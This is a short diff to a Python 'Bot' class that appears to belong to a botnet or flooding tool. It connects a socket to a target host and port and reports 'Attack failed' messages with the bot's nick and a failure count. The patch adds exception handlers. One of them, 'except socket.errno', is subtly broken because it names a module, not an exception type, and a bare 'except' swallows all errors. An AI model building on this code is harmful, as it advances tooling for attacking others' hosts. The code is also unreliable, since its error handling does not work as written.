@@ -139,9 +139,18 @@ class Bot:
             try:
                 targetSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 targetSocket.connect((host, port))
+            except socket.herror as e:
+                reason = str(e)
+            except socket.errno as e:
+                reason = str(e)
+            except socket.gaierror as e:
+                reason = str(e)
+            except socket.timeout as e:
+                reason = str(e)
             except socket.error as e:
-                if 
-
+                reason = str(e)
+            except:
+                reason = "Unknown reason"
 
             msg = ("Attack failed - " + self.botNick + " - " + str(reason))
             self.failCount = self.failCount + 1
